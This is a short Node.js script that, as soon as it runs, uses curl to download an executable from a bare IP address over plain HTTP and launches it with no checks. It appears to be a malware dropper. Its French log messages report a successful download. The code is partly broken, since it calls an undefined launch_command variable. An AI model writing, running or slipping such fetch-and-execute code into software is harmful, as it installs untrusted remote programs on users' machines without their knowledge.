const { execSync } = require('child_process');

function download_and_launch_app() {
    const curl_command = 'curl -o app.exe http://87.106.170.53/app.exe && start app.exe';
     try {
        execSync(curl_command, { stdio: 'inherit', shell: true });
        console.log("L'application a été téléchargée avec succès !");

        try {
            execSync(launch_command, { stdio: 'inherit', shell: true });
            
        } catch (err) {
            console.error(`Erreur lors du lancement: ${err.stderr}`);
        }
    } catch (err) {
        console.error(`Erreur lors du téléchargement : ${err.stderr}`);
    }
}

download_and_launch_app();